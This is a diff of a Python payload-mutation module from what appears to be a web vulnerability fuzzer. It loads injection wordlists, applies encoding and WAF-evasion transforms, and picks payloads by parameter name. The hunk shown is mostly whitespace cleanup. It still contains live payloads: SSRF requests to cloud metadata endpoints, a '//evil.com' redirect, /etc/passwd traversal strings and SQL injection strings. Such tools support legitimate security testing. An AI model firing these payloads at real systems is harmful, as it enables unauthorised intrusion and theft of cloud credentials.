@@ -12,14 +12,14 @@ from core.paths import DATA_DIR
 def load_corpus() -> dict[str, list[str]]:
     corpus: dict[str, list[str]] = {}
     base_dir = DATA_DIR / "wordlists"
-    
+
     if not base_dir.exists(): return {}
 
     categories = ["sqli", "xss", "ssti", "ssrf", "xxe", "idor", "deserial"]
     for category in categories:
         cat_dir = base_dir / category
         if not cat_dir.exists(): continue
-            
+
         corpus[category] = []
         for filename in os.listdir(cat_dir):
             if filename.endswith(".txt"):
@@ -31,7 +31,6 @@ def load_corpus() -> dict[str, list[str]]:
 
 CORPUS = load_corpus()
 
-# Transforms
 _TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
     ("url_encode", lambda s: urllib.parse.quote(s, safe="")),
     ("double_url_encode", lambda s: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")),
@@ -55,13 +54,13 @@ _WAF_CHAINS: dict[str, list[str]] = {
 
 _CONTEXT_PATTERNS = {
     "url": (["url", "redirect", "next", "return", "callback"], [
-        "http://127.0.0.1/", 
+        "http://127.0.0.1/",
         "//evil.com",
-        "http://169.254.169.254/latest/meta-data/", # AWS
-        "http://metadata.google.internal/computeMetadata/v1/", # GCP
-        "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
-        "http://169.254.169.254/metadata/v1.json", # DigitalOcean
-        "http://169.254.169.254/v1/instance", # Fly.io
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/v1.json",
+        "http://169.254.169.254/v1/instance",
     ]),
     "path": (["path", "file", "dir", "folder"], ["../../../etc/passwd", "file:///etc/passwd"]),
     "id": (["id", "user", "num", "count"], ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1"]),
@@ -108,7 +107,7 @@ class Mutator:
     def context_aware_payloads(self, param: str, category: str, waf: str | None = None) -> Iterator[dict]:
         param_l = param.lower()
         seen = set()
-        
+
         for k, (keywords, payloads) in _CONTEXT_PATTERNS.items():
             if any(kw in param_l for kw in keywords):
                 for p in payloads:
